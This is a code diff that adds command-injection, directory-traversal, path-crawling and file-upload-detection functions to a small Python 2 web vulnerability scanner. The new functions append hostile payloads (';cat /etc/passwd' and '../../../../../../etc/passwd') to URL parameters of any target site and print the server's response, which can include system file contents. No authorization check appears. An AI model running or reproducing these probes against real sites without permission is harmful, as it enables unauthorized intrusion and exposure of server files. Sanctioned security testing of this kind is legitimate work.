@@ -2,6 +2,7 @@
 __author__="Waleed & Hamza"
 import argparse
 import re
+from lxml import html
 import requests
 import whois
 import utf
@@ -11,13 +12,14 @@ import urllib3
 
 parser=argparse.ArgumentParser(description=utf.desc)
 
-# 1.1st
-parser.add_argument("action",help="Action:  whois xss sql e-mail credit-card  robots-txt")
+parser.add_argument("action",help="Action:  whois xss sql e-mail credit-card  robots-txt commandInjection directoryTraversal FileInputAvailable crawl")
 
 parser.add_argument("web_URL",help="URL")
 args = parser.parse_args()
 
 url = ""
+
+
 
 def whois1(url):
     query = whois.whois(url)
@@ -27,7 +29,6 @@ def whois1(url):
     print "-->Name server: ", query.get('name_servers')
     print "-->Email: ", query.get('emails')
 
-#1st
 
 def robotstxtAvailable(url):
     url += "/robots.txt"
@@ -40,9 +41,6 @@ def robotstxtAvailable(url):
             print "->robots.txt isn't available"
     except:
         pass
-
-
-#2nd
 
 
 
@@ -95,8 +93,6 @@ def xss(url):
         print "->XSS isn't available"
 
 
-#3rd
-
 def mail(url):
     mail1 = requests.get(url, verify=False)
     find7 = re.findall(r'[\w.-]+@[\w.-]+.\w+', mail1.content)
@@ -129,7 +125,68 @@ def credit(url):
         print "->Website hasn't a VISA card!"
 
 
-#4th
+def crawl(url):
+    crawl1 = open("crawl.txt", "r")
+    crawl2 = crawl1.readlines()
+    crawl1.close()
+    for i in crawl2:
+        try:
+            i = i.split("\n")[0]
+            crawlSite = url + str(i)
+            find = requests.get(crawlSite, verify=False)
+            if str(find.status_code) == "200":
+                print "[+]Url: ", crawlSite
+
+            else:
+                print "[-]Url: ", crawlSite
+
+        except:
+            pass
+
+def commandInjection(url):
+    try:
+        find = url.find("=")
+        find1 = url[:find + 1] + ";cat%20/etc/passwd"
+        find2 = requests.get(find1, verify=False)
+        if "www-data" in find2.content:
+            print "--> Command injection possible, payload: ;cat%20/etc/passwd"
+            print "Response: ", find2.content
+
+        else:
+            print "-> Command injection isn't possible, payload: ;cat%20/etc/passwd"
+            print "Response: ", find2.content
+
+    except:
+        print "command injection isn't available"
+
+def directoryTraversal(url):
+    try:
+        find = url.find("=")
+        find1 = url[:find + 1] + "../../../../../../etc/passwd"
+        find2 = requests.get(find1, verify=False)
+        if "www-data" in find2.content:
+            print "--> Directory traversal possible, payload: ../../../../../../etc/passwd"
+            print "Response: ", find2.content
+
+        else:
+            print "-> Directory traversal isn't possible, payload: ../../../../../../etc/passwd"
+            print "Response: ", find2.content
+    except:
+        pass
+
+def FileInputAvailable(url):
+    page = requests.get(url, verify=False)
+    tree = html.fromstring(page.content)
+    inputs = tree.xpath('//input[@name]')
+    for input in inputs:
+        startPoint = int(str(input).find("'")) + 1
+        stopPoint = int(str(input).find("'", startPoint))
+        print str(input)[startPoint:stopPoint]
+        if "type='file'" in input:
+            print "--> File Upload Function available"
+
+
+
 
 
 
@@ -156,7 +213,17 @@ if args:
     elif args.action=="robots-txt":
         robotstxtAvailable(url)
 
-#6th
+    elif args.action == "crawl":
+        crawl(url)
+
+    elif args.action == "FileInputAvailable":
+        FileInputAvailable(url)
+
+    elif args.action == "directoryTraversal":
+        directoryTraversal(url)
+
+    elif args.action == "commandInjection":
+        commandInjection(url)
 
     else:
         print "Invalid Action"
